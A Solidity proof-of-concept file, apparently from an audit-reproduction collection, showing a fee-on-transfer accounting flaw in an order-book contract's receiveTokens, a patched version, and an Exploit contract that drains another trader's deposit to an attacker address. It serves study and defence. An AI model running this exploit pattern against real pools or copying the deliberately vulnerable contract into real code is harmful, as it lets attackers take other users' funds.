// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Hanji LOB.receiveTokens (MixBytes, AuditVault #56840).
    SYNTHETIC, cheatcode-free, single transaction.

    receiveTokens credits the amount passed to safeTransferFrom. A
    fee-on-transfer token delivers less. The caller is then owed tokens
    the pool never received and withdraws them from another trader. */

contract Mini {
    string public constant name = "Fee Token";
    string public constant symbol = "FEE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public lob;

    function setLob(address lob_) external {
        lob = lob_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        uint256 fee = (to == lob && amount > 0) ? amount / 10 : 0;
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
        if (fee > 0) balanceOf[address(0xdead)] += fee;
        return true;
    }
}

contract LOB {
    Mini public immutable token;
    mapping(address => uint256) public balances;

    constructor(Mini token_) {
        token = token_;
    }

    function receiveTokens(uint256 amount) external {
        // @> VULN: credits `amount` with no check that the balance rose by `amount`
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        balances[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }
}

contract LOBFixed {
    Mini public immutable token;
    mapping(address => uint256) public balances;

    constructor(Mini token_) {
        token = token_;
    }

    function receiveTokens(uint256 amount) external {
        uint256 beforeBal = token.balanceOf(address(this));
        token.transferFrom(msg.sender, address(this), amount);
        uint256 got = token.balanceOf(address(this)) - beforeBal;
        require(got == amount, "fee-on-transfer");
        balances[msg.sender] += got;
    }

    function withdraw(uint256 amount) external {
        balances[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }
}

contract Trader {
    function deposit(Mini token, LOB lob, uint256 amount) external {
        token.approve(address(lob), amount);
        lob.receiveTokens(amount);
    }

    function depositFixed(Mini token, LOBFixed lob, uint256 amount) external {
        token.approve(address(lob), amount);
        lob.receiveTokens(amount);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant VICTIM_IN = 5_000 ether;
    uint256 internal constant ATTACK_IN = 10_000 ether;

    Mini public token;
    LOB public lob;
    Trader public victim;
    uint256 public victimCredit;
    uint256 public attackerCredit;
    uint256 public poolAfterDeposits;
    uint256 public fairDelivered;
    uint256 public excess;
    uint256 public poolLeft;
    uint256 public victimShort;

    function run() external {
        token = new Mini();
        lob = new LOB(token);
        victim = new Trader();
        token.setLob(address(lob));
        token.mint(address(victim), VICTIM_IN);
        token.mint(address(this), ATTACK_IN);
        victim.deposit(token, lob, VICTIM_IN);
        token.approve(address(lob), ATTACK_IN);
        lob.receiveTokens(ATTACK_IN);
        victimCredit = lob.balances(address(victim));
        attackerCredit = lob.balances(address(this));
        poolAfterDeposits = token.balanceOf(address(lob));
        fairDelivered = ATTACK_IN - ATTACK_IN / 10;
        lob.withdraw(attackerCredit);
        excess = token.balanceOf(address(this)) - fairDelivered;
        token.transfer(ATTACKER, excess);
        poolLeft = token.balanceOf(address(lob));
        victimShort = victimCredit - poolLeft;
    }
}
